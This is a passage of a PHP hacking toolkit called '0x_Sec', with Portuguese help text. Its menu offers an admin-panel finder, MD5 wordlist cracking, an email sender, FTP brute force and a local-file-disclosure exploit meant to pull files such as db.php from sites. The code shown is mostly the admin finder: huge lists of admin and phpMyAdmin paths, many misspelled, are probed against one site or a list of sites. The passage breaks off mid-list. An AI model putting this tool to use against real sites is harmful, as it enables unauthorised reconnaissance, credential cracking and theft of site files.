<?php
	/*
		[+] Criado Por Pablo Santhus
		[+] 0x_Sec Toll hacking
		[+] 22/11/16

	*/
		error_reporting(0);
		function banner(){
			echo "

   ___          _____                      _ _         
  / _ \        / ____|                    (_) |        
 | | | |_  __ | (___   ___  ___ _   _ _ __ _| |_ _   _ 
 | | | \ \/ /  \___ \ / _ \/ __| | | | '__| | __| | | |
 | |_| |>  <   ____) |  __/ (__| |_| | |  | | |_| |_| |
  \___//_/\_\ |_____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                  __/ | 0.1
                                                 |___/ 
 [+] 0x_Sec
 [+] Plataforma: php
 [+] Criado: Pablo Santhus
 [+] Ajuda: php 0x_sec.php -h\n
";
		}
		banner();

		if($argv[1] == "-h"){
		echo "
	OPTIONS [ADMIN, MD5, EMAIL, FTPBRUTE, LFD, BASE64]

	[1] ADMIN
	[2] MD5
	[3] EMAIL
	[4] FTPBRUTE
	[5] LFD
	[6] BASE64

	";
	if(!isset($argv[2])){
		echo "exemplo: php 0x_sec.php -h 1\n\n";
		}
	}
	
	if($argv[1] == "-h" && $argv[2] == "1"){
			echo "
	[+] Finder Admin

	-u 		Url do site.
	-url 		Varios sites em um lista.

	exemplo: php 0x_sec.php ADMIN -u http://www.google.com
	exemplo: php 0x_sec.php ADMIN -url site.txt\n\n
	";
		}

	if($argv[1] == "-h" && $argv[2] == "2"){
		echo "
	[+] MD5 Criptografar e Descriptografar

	-s 			Senha criptografada.
	-w 			Wordlist para Descriptografar a hash.
	-e 			Criptografar uma string.

	exemplo: php 0x_sec.php MD5 -s 7e4b64eb65e34fdfad79e623c44abd94 -w wordlist.txt
	exemplo: php 0x_sec.php MD5 -e pablo\n\n

		";
	}

	if($argv[1] == "-h" && $argv[2] == "3"){
		echo "

 	[+] Email Sender

    -m 			Informacoes para enviar o email.

 	exemplo: php 0x_sec.php EMAIL -m SEUNOME seuemail@gmail.com ASSUNTO DESTINATARIO mensagem.txt 
	";
	
}
	if($argv[1] == "-h" && $argv[2] == "4"){
		echo "
	[+] FTP Brute Force

	-u 			Nome de usuario FTP.
	-w 			Adiciona sua wordlist.

	exemplo: php 0x_sec.php FTPBRUTE 127.0.0.1 -u admin -w wordlist.txt

	OBS: A opcao 127.0.0.1 sera o HOST.\n\n

		";
	}

	if($argv[1] == "-h" && $argv[2] == "5"){
		echo "
	[+] LFD EXPLOIT

	-u 		URL do site.
	-db 		Complementos para download do site.

	exemplo: php 0x_sec.php LFD -u http://www.exemplotest.com/baixar.php?file=
	exemplo: php 0x_sec.php LFD -u http://www.exemplotest.com/baixar.php?file= -db conexao/db.php\n\n
		";
	}

	if($argv[1] == "-h" && $argv[2] == "6"){
		echo "

	[+] BASE64 Encode e Decode 

	-e 		Encriptar em Base64 
	-d 		Decode em Base64 

	exemplo: php 0x_sec.php -e pablo 
	exemplo: php 0x_sec.php -d cGFibG8=\n\n


		";
	}

		if($argv[1] == "ADMIN"){
			if($argv[2] == "-u"){
				$url = $argv[3] . "/";
				if(!strstr($url, "http://") && !strstr($url, "https://")){
					$url = "http://".$url;
				}
				$webs = array("/phpMyAdmin/","/phpmyadmin/","/PMA/",":2082/","/admin/","/dbadmin/","/mysql","/myadmin/","/phpmyadmin2/","/phpMyAdmin2/","/phpMyAdmin-2/","/php-my-admin/","/phpMyAdmin-2.2.3/","/phpMyAdmin-2.2.6/","/phpMyAdmin-2.5.1/","/phpMyAdmin-2.5.4/","/phpMyAdmin-2.5.5-rc1/","/phpMyAdmin-2.5.5-rc2/","/phpMyAdmin-2.5.5/","/phpMyAdmin-2.5.5-pl1/","/phpMyAdmin-2.5.6-rc1/","/phpMyAdmin-2.5.6-rc2/","/phpMyAdmin-2.5.6/","/phpMyAdmin-2.5.7/","/phpMyAdmin-2.5.7-pl1/","/hpMyAdmin-2.6.0-alpha","/phpMyAdmin-2.6.0-alpha2/","/phpMyAdmin-2.6.0-beta1/","/phpMyAdmin-2.6.0-beta2/","/phpMyAdmin-2.6.0-rc1/","/phpMyAdmin-2.6.0-rc2/","/phpMyAdmin-2.6.0-rc3/","/phpMyAdmin-2.6.0/","/phpMyAdmin-2.6.0-pl1/","/phpMyAdmin-2.6.0-pl2/","/phpMyAdmin-2.6.0-pl3/","/phpMyAdmin-2.6.1-rc1/","/phpMyAdmin-2.6.1-rc2/","/phpMyAdmin-2.6.1/","/phpMyAdmin-2.6.1-pl1/","/phpMyAdmin-2.6.1-pl2/","/phpMyAdmin-2.6.1-pl3/","/phpMyAdmin-2.6.2-rc1/","/phpMyAdmin-2.6.2-beta1/","/phpMyAdmin-2.6.2-rc1/","/phpMyAdmin-2.6.2/","/phpMyAdmin-2.6.2-pl1/","/phpMyAdmin-2.6.3/","/phpMyAdmin-2.6.3-rc1/","/phpMyAdmin-2.6.3/","/phpMyAdmin-2.6.3-pl1/","/phpMyAdmin-2.6.4-rc1/","/phpMyAdmin-2.6.4-pl1/","/phpMyAdmin-2.6.4-pl2/","/hpMyAdmin-2.6.4-pl3/","/phpMyAdmin-2.6.4-pl4/","/phpMyAdmin-2.6.4/","/phpMyAdmin-2.7.0-beta1/","/phpMyAdmin-2.7.0-rc1/","/phpMyAdmin-2.7.0-pl1/","/phpMyAdmin-2.7.0-pl2/","/phpMyAdmin-2.7.0/","/phpMyAdmin-2.8.0-beta1/","/hpMyAdmin-2.8.0-rc1/","/phpMyAdmin-2.8.0-rc2/","/phpMyAdmin-2.8.0/","/hpMyAdmin-2.8.0.1","/phpMyAdmin-2.8.0.2/","/phpMyAdmin-2.8.0.3/","/phpMyAdmin-2.8.0.4/","/phpMyAdmin-2.8.1-rc1/","/phpMyAdmin-2.8.1/","/phpMyAdmin-2.8.2/","/sqlmanager/","/ysqlmanager/","/p/m/a/","/PMA2005/","/pma2005/","/phpmanager/","/php-myadmin/","/phpmy-admin/","/webadmin/","/sqlweb/","/websql/","/webdb/","/mysqladmin/","/mysql-admin/","/private.php/","/robots.txt/","/photoalbum/upload/","/_vti_pvt/",":5800/","/hpMyAdmin/","/config.html/","/_private/","admin1.php","admin1.html","admin2.php","dmin2.html","yonetim.php","yonetim.html","yonetici.php","yonetici.html","adm/","admin/","admin/account.php","admin/account.html","admin/index.php","admin/index.html","admin/ogin.php","admin/login.html","admin/home.php","admin/controlpanel.html","admin/ontrolpanel.php","admin.php","admin.html","admin/cp.php","admin/cp.html","cp.php","p.html","administrator/","administrator/index.html","administrator/index.php","dministrator/login.html","administrator/login.php","administrator/account.html","dministrator/account.php","administrator.php","administrator.html","login.php","ogin.html","modelsearch/login.php","moderator.php","moderator.html","moderator/ogin.php","moderator/login.html","moderator/admin.php","moderator/admin.html","moderator/","account.php","account.html","controlpanel/","controlpanel.php","controlpanel.html","dmincontrol.php","admincontrol.html","adminpanel.php","adminpanel.html","admin1.asp","dmin2.asp","yonetim.asp","yonetici.asp","admin/account.asp","admin/index.asp","admin/ogin.asp","admin/home.asp","admin/controlpanel.asp","admin.asp","admin/cp.asp","cp.asp","administrator/index.asp","administrator/login.asp","administrator/account.asp","administrator.asp","login.asp","modelsearch/login.asp","moderator.asp","moderator/ogin.asp","moderator/admin.asp","account.asp","controlpanel.asp","admincontrol.asp",
"adminpanel.asp","fileadmin/","fileadmin.php","fileadmin.asp","fileadmin.html","administration/","dministration.php","administration.html","sysadmin.php","sysadmin.html","phpmyadmin/","myadmin/","sysadmin.asp","sysadmin/","ur-admin.asp","ur-admin.php","ur-admin.html","ur-admin/","erver.php","Server.html","Server.asp","Server/","wp-admin/","administr8.php","administr8.html","administr8/","administr8.asp","webadmin/","webadmin.php","webadmin.asp","webadmin.html","dministratie/","admins/","admins.php","admins.asp","administrivia/","Database_Administration/","WebAdmin/","useradmin/","sysadmins/","admin1/","system-administration/","administrators/","gadmin/","directadmin/","staradmin/","ServerAdministrator/","SysAdmin/","administer/","iveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cPanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","autologin/","support_login/","meta_login/","anuallogin/","simpleLogin/","loginflat/","utility_login/","showlogin/","memlogin/","members/","ogin-redirect/","sub-login/","wp-login/","login1/","dir-login/","login_db/","xlogin/","mblogin/","customer_login/","UserLogin/","login-us/","acct_login/","admin_area/","bigadmin/","roject-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","izmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","otus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","anneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","lobes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","ogo_sysadmin/","server/","database_administration/","power_user/","system_administration/","ss_vms_admin_sm/","admin.%EXT%","login.htm","login.html","login/","login.%EXT%","adm/","admin/","admin/ccount.html","admin/login.html","admin/login.htm","admin/home.%EXT%","admin/controlpanel.html","admin/controlpanel.htm","admin/cp.%EXT%","admin/adminLogin.html","admin/adminLogin.htm","adminadmin_login.%EXT%","admin/controlpanel.%EXT%","admin/admin-login.%EXT%","admin-login.%EXT%","admin/account.%EXT%","admin/admin.%EXT%","admin.htm","admin.html","adminitem/","dminitem.%EXT%","adminitems/","adminitems.%EXT%","administrator/","administrator/login.%EXT%","dministrator.%EXT%","administration/","administration.%EXT%","adminLogin/","adminlogin.%EXT%","dmin_area/admin.%EXT%","admin_area/","admin_area/login.%EXT%","manager/","manager.%EXT%","etmein/","letmein.%EXT%","superuser/","superuser.%EXT%","access/","access.%EXT%","sysadm/","ysadm.%EXT%","superman/","supervisor/","panel.%EXT%","control/","control.%EXT%","member/","member.%EXT%","members/","members.%EXT%","user/","user.%EXT%","cp/","uvpanel/","manage/","anage.%EXT%","management/","management.%EXT%","signin/","signin.%EXT%","log-in/","log-in.%EXT%","log_in/","log_in.%EXT%","sign_in/","sign_in.%EXT%","sign-in/","sign-in.%EXT%","users/","sers.%EXT%","accounts/","accounts.%EXT%","wp-login.php","bb-admin/login.%EXT%","bb-admin/dmin.%EXT%","bb-admin/admin.html","administrator/account.%EXT%","relogin.htm","relogin.html","heck.%EXT%","relogin.%EXT%","processlogin.%EXT%","checklogin.%EXT%","checkuser.%EXT%","checkadmin.%EXT%","isadmin.%EXT%","authenticate.%EXT%","authentication.%EXT%","auth.%EXT%","uthuser.%EXT%","authadmin.%EXT%","cp.%EXT%","modelsearch/login.%EXT%","moderator.%EXT%","moderator/","controlpanel/","controlpanel.%EXT%","admincontrol.%EXT%","adminpanel.%EXT%","ileadmin/","fileadmin.%EXT%","sysadmin.%EXT%","admin1.%EXT%","admin1.html","admin1.htm","admin2.%EXT%","admin2.html","yonetim.%EXT%","yonetim.html","yonetici.%EXT%","yonetici.html","hpmyadmin/","myadmin/","ur-admin.%EXT%","ur-admin/","Server.%EXT%","Server/","wp-admin/","dministr8.%EXT%","administr8/","webadmin/","webadmin.%EXT%","administratie/","admins/","admins.%EXT%","administrivia/","Database_Administration/","useradmin/","sysadmins/","admin1/","ystem-administration/","administrators/","pgadmin/","directadmin/","staradmin/","erverAdministrator/","SysAdmin/","administer/","LiveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","autologin/","support_login/","meta_login/","manuallogin/","simpleLogin/","loginflat/","utility_login/","howlogin/","memlogin/","login-redirect/","sub-login/","wp-login/","login1/","dir-login/","ogin_db/","xlogin/","smblogin/","customer_login/","UserLogin/","login-us/","acct_login/","igadmin/","project-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","wizmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","otus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","shadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","logo_sysadmin/","power_user/","ystem_administration/","ss_vms_admin_sm/","bb-admin/","panel-administracion/","memberadmin/","dministratorlogin/","adm.%EXT%","panel-administracion/login.%EXT%","pages/admin/dmin-login.%EXT%","pages/admin/","acceso.%EXT%","admincp/login.%EXT%","admincp/","admincontrol/","affiliate.%EXT%","adm_auth.%EXT%","memberadmin.%EXT%","administratorlogin.%EXT%","modules/dmin/","administrators.%EXT%","siteadmin/","siteadmin.%EXT%","adminsite/","kpanel/","vorod/","orod.%EXT%","vorud/","vorud.%EXT%","adminpanel/","PSUser/","secure/","webmaster/","ebmaster.%EXT%","autologin.%EXT%","userlogin.%EXT%","admin_area.%EXT%","cmsadmin.%EXT%","ecurity/","usr/","root/","secret/","admin/login.%EXT%","admin/adminLogin.%EXT%","moderator.php","moderator.html","moderator/login.%EXT%","moderator/admin.%EXT%","yonetici.%EXT%","0admin/","manager/","aadmin/","cgi-bin/login%EXT%","login1%EXT%","login_admin/","login_admin%EXT%","ogin_out/","login_out%EXT%","login_user%EXT%","loginerror/","loginok/","loginsave/","oginsuper/","loginsuper%EXT%","login%EXT%","logout/","logout%EXT%","secrets/","super1/","super1%EXT%","uper_index%EXT%","super_login%EXT%","supermanager%EXT%","superman%EXT%","superuser%EXT%","upervise/","supervise/Login%EXT%","super%EXT%","admin1.php","admin1.html","admin2.php","dmin2.html","yonetim.php","yonetim.html","yonetici.php","yonetici.html","adm/","admin/","admin/ccount.php","admin/account.html","admin/index.php","admin/index.html","admin/login.php","admin/ogin.html","admin/home.php","admin/controlpanel.html","admin/controlpanel.php","admin.php","dmin.html","admin/cp.php","admin/cp.html","cp.php","cp.html","administrator/","administrator/ndex.html","administrator/index.php","administrator/login.html","administrator/login.php","dministrator/account.html","administrator/account.php","administrator.php","administrator.html","login.php","login.html","modelsearch/login.php","moderator.php","moderator.html","moderator/ogin.php","moderator/login.html","moderator/admin.php","moderator/admin.html","moderator/","ccount.php","account.html","controlpanel/","controlpanel.php","controlpanel.html","dmincontrol.php","admincontrol.html","adminpanel.php","adminpanel.html","admin1.asp","dmin2.asp","yonetim.asp","yonetici.asp","admin/index.asp","admin/login.asp","admin/home.asp","admin/ontrolpanel.asp","admin.asp","admin/cp.asp","cp.asp","administrator/index.asp","administrator/ccount.asp","administrator.asp","login.asp","modelsearch/login.asp","moderator.asp","moderator/ogin.asp","moderator/admin.asp","account.asp","controlpanel.asp","admincontrol.asp","dminpanel.asp","fileadmin.php","fileadmin.asp","fileadmin.html","administration/","dministration.php","administration.html","sysadmin.php","sysadmin.html","phpmyadmin/","myadmin/","sysadmin.asp","sysadmin/","ur-admin.asp","ur-admin.php","ur-admin.html","ur-admin/","Server.php","Server.html","Server.asp","Server/","wp-admin/","administr8.php","administr8.html","administr8/","administr8.asp","webadmin/","webadmin.php","webadmin.asp","webadmin.html","dministratie/","admins/","admins.php","admins.asp","admins.html","administrivia/","atabase_Administration/","WebAdmin/","useradmin/","sysadmins/","admin1/","system-administration/","administrators/","pgadmin/","directadmin/","staradmin/","ServerAdministrator/","SysAdmin/","dminister/","LiveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cPanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","support_login/","meta_login/","anuallogin/","simpleLogin/","loginflat/","utility_login/","showlogin/","memlogin/","members/","ogin-redirect/","sub-login/","wp-login/","login1/","dir-login/","login_db/","xlogin/","smblogin/","customer_login/","UserLogin/","login-us/","acct_login/","admin_area/","bigadmin/","roject-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","izmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","otus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","anneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","ogo_sysadmin/","server/","power_user/","system_administration/","ss_vms_admin_sm/");
				foreach($webs as $web){
					$caminho = $url . $web;
					$header = get_headers($caminho);
					if(strstr($header[0], "200")){
						print "\n -------------------------------------------------------------\n";
						echo "\n[+] Found " . $caminho . "\n";
						print "\n -------------------------------------------------------------\n";
						$fp = fopen("admin.txt", "a");
						fwrite($fp, "[+] ".$caminho . "\n");
					}else{
						echo "[-] NOT Found " . $caminho . "\n";
					}
				}
					$text = file_get_contents("admin.txt");
					print "\n ----------------------------------------------------------\n";
					echo "\n Paginas encontradas:\n {$text} \n";
					$fp = fopen("admin.txt", "w"); fwrite($fp, "");fclose($fp);
					print "\n ----------------------------------------------------------\n";
			}
			if($argv[2] == "-url"){
				$urls = file($argv[3]);
				foreach($urls as $url){
					$url = str_replace("\r", "", $url);
					$url = str_replace("\n", "", $url);
					$website = array("/phpMyAdmin/","/phpmyadmin/","/PMA/",":2082/","/admin/","/dbadmin/","/mysql","/myadmin/","/phpmyadmin2/","/phpMyAdmin2/","/phpMyAdmin-2/","/php-my-admin/","/hpMyAdmin-2.2.3/","/phpMyAdmin-2.2.6/","/phpMyAdmin-2.5.1/","/phpMyAdmin-2.5.4/","/hpMyAdmin-2.5.5-rc1/","/phpMyAdmin-2.5.5-rc2/","/phpMyAdmin-2.5.5/","/hpMyAdmin-2.5.5-pl1/","/phpMyAdmin-2.5.6-rc1/","/phpMyAdmin-2.5.6-rc2/","/hpMyAdmin-2.5.6/","/phpMyAdmin-2.5.7/","/phpMyAdmin-2.5.7-pl1/","/hpMyAdmin-2.6.0-alpha","/phpMyAdmin-2.6.0-alpha2/","/phpMyAdmin-2.6.0-beta1/","/phpMyAdmin-2.6.0-beta2/","/hpMyAdmin-2.6.0-rc1/","/phpMyAdmin-2.6.0-rc2/","/phpMyAdmin-2.6.0-rc3/","/hpMyAdmin-2.6.0/","/phpMyAdmin-2.6.0-pl1/","/phpMyAdmin-2.6.0-pl2/","/hpMyAdmin-2.6.0-pl3/","/phpMyAdmin-2.6.1-rc1/","/phpMyAdmin-2.6.1-rc2/","/hpMyAdmin-2.6.1/","/phpMyAdmin-2.6.1-pl1/","/phpMyAdmin-2.6.1-pl2/","/hpMyAdmin-2.6.1-pl3/","/phpMyAdmin-2.6.2-rc1/","/phpMyAdmin-2.6.2-beta1/","/hpMyAdmin-2.6.2-rc1/","/phpMyAdmin-2.6.2/","/phpMyAdmin-2.6.2-pl1/","/phpMyAdmin-2.6.3/","/phpMyAdmin-2.6.3-rc1/","/phpMyAdmin-2.6.3/","/phpMyAdmin-2.6.3-pl1/","/hpMyAdmin-2.6.4-rc1/","/phpMyAdmin-2.6.4-pl1/","/phpMyAdmin-2.6.4-pl2/","/hpMyAdmin-2.6.4-pl3/","/phpMyAdmin-2.6.4-pl4/","/phpMyAdmin-2.6.4/","/hpMyAdmin-2.7.0-beta1/","/phpMyAdmin-2.7.0-rc1/","/phpMyAdmin-2.7.0-pl1/","/hpMyAdmin-2.7.0-pl2/","/phpMyAdmin-2.7.0/","/phpMyAdmin-2.8.0-beta1/","/hpMyAdmin-2.8.0-rc1/","/phpMyAdmin-2.8.0-rc2/","/phpMyAdmin-2.8.0/","/hpMyAdmin-2.8.0.1","/phpMyAdmin-2.8.0.2/","/phpMyAdmin-2.8.0.3/","/phpMyAdmin-2.8.0.4/","/hpMyAdmin-2.8.1-rc1/","/phpMyAdmin-2.8.1/","/phpMyAdmin-2.8.2/","/sqlmanager/","/ysqlmanager/","/p/m/a/","/PMA2005/","/pma2005/","/phpmanager/","/php-myadmin/","/hpmy-admin/","/webadmin/","/sqlweb/","/websql/","/webdb/","/mysqladmin/","/mysql-admin/","/private.php/","/robots.txt/","/photoalbum/upload/","/_vti_pvt/",":5800/","/hpMyAdmin/","/config.html/","/_private/","admin1.php","admin1.html","admin2.php","dmin2.html","yonetim.php","yonetim.html","yonetici.php","yonetici.html","adm/","admin/","admin/account.php","admin/account.html","admin/index.php","admin/index.html","admin/ogin.php","admin/login.html","admin/home.php","admin/controlpanel.html","admin/ontrolpanel.php","admin.php","admin.html","admin/cp.php","admin/cp.html","cp.php","p.html","administrator/","administrator/index.html","administrator/index.php","dministrator/login.html","administrator/login.php","administrator/account.html","dministrator/account.php","administrator.php","administrator.html","login.php","ogin.html","modelsearch/login.php","moderator.php","moderator.html","moderator/ogin.php","moderator/login.html","moderator/admin.php","moderator/admin.html","moderator/","account.php","account.html","controlpanel/","controlpanel.php","controlpanel.html","dmincontrol.php","admincontrol.html","adminpanel.php","adminpanel.html","admin1.asp","dmin2.asp","yonetim.asp","yonetici.asp","admin/account.asp","admin/index.asp","admin/ogin.asp","admin/home.asp","admin/controlpanel.asp","admin.asp","admin/cp.asp","cp.asp","administrator/index.asp","administrator/login.asp","administrator/account.asp","dministrator.asp","login.asp","modelsearch/login.asp","moderator.asp","moderator/ogin.asp","moderator/admin.asp","account.asp","controlpanel.asp","admincontrol.asp",
"adminpanel.asp","fileadmin/","fileadmin.php","fileadmin.asp","fileadmin.html","administration/","dministration.php","administration.html","sysadmin.php","sysadmin.html","phpmyadmin/","myadmin/","sysadmin.asp","sysadmin/","ur-admin.asp","ur-admin.php","ur-admin.html","ur-admin/","erver.php","Server.html","Server.asp","Server/","wp-admin/","administr8.php","administr8.html","administr8/","administr8.asp","webadmin/","webadmin.php","webadmin.asp","webadmin.html","dministratie/","admins/","admins.php","admins.asp","administrivia/","Database_Administration/","WebAdmin/","useradmin/","sysadmins/","admin1/","system-administration/","administrators/","gadmin/","directadmin/","staradmin/","ServerAdministrator/","SysAdmin/","administer/","iveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cPanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","autologin/","support_login/","meta_login/","anuallogin/","simpleLogin/","loginflat/","utility_login/","showlogin/","memlogin/","members/","ogin-redirect/","sub-login/","wp-login/","login1/","dir-login/","login_db/","xlogin/","mblogin/","customer_login/","UserLogin/","login-us/","acct_login/","admin_area/","bigadmin/","roject-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","izmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","otus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","anneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","lobes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","ogo_sysadmin/","server/","database_administration/","power_user/","system_administration/","ss_vms_admin_sm/","admin.%EXT%","login.htm","login.html","login/","login.%EXT%","adm/","admin/","admin/ccount.html","admin/login.html","admin/login.htm","admin/home.%EXT%","admin/controlpanel.html","admin/controlpanel.htm","admin/cp.%EXT%","admin/adminLogin.html","admin/adminLogin.htm","adminadmin_login.%EXT%","admin/controlpanel.%EXT%","admin/admin-login.%EXT%","admin-login.%EXT%","admin/account.%EXT%","admin/admin.%EXT%","admin.htm","admin.html","adminitem/","dminitem.%EXT%","adminitems/","adminitems.%EXT%","administrator/","administrator/login.%EXT%","dministrator.%EXT%","administration/","administration.%EXT%","adminLogin/","adminlogin.%EXT%","dmin_area/admin.%EXT%","admin_area/","admin_area/login.%EXT%","manager/","manager.%EXT%","etmein/","letmein.%EXT%","superuser/","superuser.%EXT%","access/","access.%EXT%","sysadm/","ysadm.%EXT%","superman/","supervisor/","panel.%EXT%","control/","control.%EXT%","member/","member.%EXT%","members/","members.%EXT%","user/","user.%EXT%","cp/","uvpanel/","manage/","anage.%EXT%","management/","management.%EXT%","signin/","signin.%EXT%","log-in/","log-in.%EXT%","log_in/","log_in.%EXT%","sign_in/","sign_in.%EXT%","sign-in/","sign-in.%EXT%","users/","sers.%EXT%","accounts/","accounts.%EXT%","wp-login.php","bb-admin/login.%EXT%","bb-admin/dmin.%EXT%","bb-admin/admin.html","administrator/account.%EXT%","relogin.htm","relogin.html","heck.%EXT%","relogin.%EXT%","processlogin.%EXT%","checklogin.%EXT%","checkuser.%EXT%","checkadmin.%EXT%","isadmin.%EXT%","authenticate.%EXT%","authentication.%EXT%","auth.%EXT%","uthuser.%EXT%","authadmin.%EXT%","cp.%EXT%","modelsearch/login.%EXT%","moderator.%EXT%","moderator/","controlpanel/","controlpanel.%EXT%","admincontrol.%EXT%","adminpanel.%EXT%","ileadmin/","fileadmin.%EXT%","sysadmin.%EXT%","admin1.%EXT%","admin1.html","admin1.htm","admin2.%EXT%","admin2.html","yonetim.%EXT%","yonetim.html","yonetici.%EXT%","yonetici.html","hpmyadmin/","myadmin/","ur-admin.%EXT%","ur-admin/","Server.%EXT%","Server/","wp-admin/","dministr8.%EXT%","administr8/","webadmin/","webadmin.%EXT%","administratie/","admins/","admins.%EXT%","administrivia/","Database_Administration/","useradmin/","sysadmins/","admin1/","ystem-administration/","administrators/","pgadmin/","directadmin/","staradmin/","erverAdministrator/","SysAdmin/","administer/","LiveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","autologin/","support_login/","meta_login/","manuallogin/","simpleLogin/","loginflat/","utility_login/","howlogin/","memlogin/","login-redirect/","sub-login/","wp-login/","login1/","dir-login/","ogin_db/","xlogin/","smblogin/","customer_login/","UserLogin/","login-us/","acct_login/","igadmin/","project-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","wizmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","otus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","shadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","logo_sysadmin/","power_user/","ystem_administration/","ss_vms_admin_sm/","bb-admin/","panel-administracion/","memberadmin/","dministratorlogin/","adm.%EXT%","panel-administracion/login.%EXT%","pages/admin/dmin-login.%EXT%","pages/admin/","acceso.%EXT%","admincp/login.%EXT%","admincp/","admincontrol/","affiliate.%EXT%","adm_auth.%EXT%","memberadmin.%EXT%","administratorlogin.%EXT%","modules/dmin/","administrators.%EXT%","siteadmin/","siteadmin.%EXT%","adminsite/","kpanel/","vorod/","orod.%EXT%","vorud/","vorud.%EXT%","adminpanel/","PSUser/","secure/","webmaster/","ebmaster.%EXT%","autologin.%EXT%","userlogin.%EXT%","admin_area.%EXT%","cmsadmin.%EXT%","ecurity/","usr/","root/","secret/","admin/login.%EXT%","admin/adminLogin.%EXT%","moderator.php","moderator.html","moderator/login.%EXT%","moderator/admin.%EXT%","yonetici.%EXT%","0admin/","manager/","aadmin/","cgi-bin/login%EXT%","login1%EXT%","login_admin/","login_admin%EXT%","ogin_out/","login_out%EXT%","login_user%EXT%","loginerror/","loginok/","loginsave/","oginsuper/","loginsuper%EXT%","login%EXT%","logout/","logout%EXT%","secrets/","super1/","super1%EXT%","uper_index%EXT%","super_login%EXT%","supermanager%EXT%","superman%EXT%","superuser%EXT%","upervise/","supervise/Login%EXT%","super%EXT%","admin1.php","admin1.html","admin2.php","dmin2.html","yonetim.php","yonetim.html","yonetici.php","yonetici.html","adm/","admin/","admin/ccount.php","admin/account.html","admin/index.php","admin/index.html","admin/login.php","admin/ogin.html","admin/home.php","admin/controlpanel.html","admin/controlpanel.php","admin.php","dmin.html","admin/cp.php","admin/cp.html","cp.php","cp.html","administrator/","administrator/ndex.html","administrator/index.php","administrator/login.html","administrator/login.php","dministrator/account.html","administrator/account.php","administrator.php","administrator.html","login.php","login.html","modelsearch/login.php","moderator.php","moderator.html","moderator/ogin.php","moderator/login.html","moderator/admin.php","moderator/admin.html","moderator/","ccount.php","account.html","controlpanel/","controlpanel.php","controlpanel.html","dmincontrol.php","admincontrol.html","adminpanel.php","adminpanel.html","admin1.asp","dmin2.asp","yonetim.asp","yonetici.asp","admin/index.asp","admin/login.asp","admin/home.asp","admin/ontrolpanel.asp","admin.asp","admin/cp.asp","cp.asp","administrator/index.asp","administrator/ccount.asp","administrator.asp","login.asp","modelsearch/login.asp","moderator.asp","moderator/ogin.asp","moderator/admin.asp","account.asp","controlpanel.asp","admincontrol.asp","dminpanel.asp","fileadmin.php","fileadmin.asp","fileadmin.html","administration/","dministration.php","administration.html","sysadmin.php","sysadmin.html","phpmyadmin/","myadmin/","sysadmin.asp","sysadmin/","ur-admin.asp","ur-admin.php","ur-admin.html","ur-admin/","Server.php","Server.html","Server.asp","Server/","wp-admin/","administr8.php","administr8.html","administr8/","administr8.asp","webadmin/","webadmin.php","webadmin.asp","webadmin.html","dministratie/","admins/","admins.php","admins.asp","admins.html","administrivia/","atabase_Administration/","WebAdmin/","useradmin/","sysadmins/","admin1/","system-administration/","administrators/","pgadmin/","directadmin/","staradmin/","ServerAdministrator/","SysAdmin/","dminister/","LiveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cPanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","support_login/","meta_login/","anuallogin/","simpleLogin/","loginflat/","utility_login/","showlogin/","memlogin/","members/","ogin-redirect/","sub-login/","wp-login/","login1/","dir-login/","login_db/","xlogin/","smblogin/","customer_login/","UserLogin/","login-us/","acct_login/","admin_area/","bigadmin/","r